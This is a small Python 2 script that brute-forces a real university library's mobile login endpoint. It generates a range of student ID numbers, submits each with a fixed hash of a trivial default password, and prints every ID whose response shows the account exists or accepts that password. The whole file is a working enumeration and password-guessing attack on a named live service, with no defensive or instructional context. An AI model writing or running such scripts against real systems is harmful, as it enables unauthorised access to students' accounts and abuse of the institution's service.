# -*- coding: utf-8 -*-

import sys
import time
import socket
import requests


import threading

 



def printcn(b):         #配置中文输出函数
    sys_encoding = sys.getfilesystemencoding()
    print(b.decode('utf-8').encode(sys_encoding))

   
    reload(sys)
    sys.setdefaultencoding("utf-8")

def xhjc(xh):
    url = 'http://mob.huanghuai.edu.cn/huanghuai/booksLogin'
    headers = {'cache':'60','Cache-Control':'max-age=2592000','Content-Type':'application/x-www-form-urlencoded','Content-Length':'60','Host':'mob.huanghuai.edu.cn','Connection':'Keep-Alive','Accept-Encoding':'gzip','User-Agent':'okhttp/3.9.0'}
    data = {'jszh':'YKT'+str(xh)+'','password':'202cb962ac59075b964b07152d234b70'}
    Soj_session = requests.session()
    res = Soj_session.post(url, data=data, headers=headers)
    nr=res.text 

    if '-2' in nr:
        #  print xh
          return 0
    if '-1' in nr:
        #  print xh
          return 1
    if  '0' in nr:
        #  print xh
          return 2



z=100
xh='15'+str(z)+'10101'

while z<999:

    z=z+1
    xh='15'+str(z)+'10101'

    if xhjc(xh)>0:
            print '  vvv '+str(xh)



raw_input("Press <enter>")

            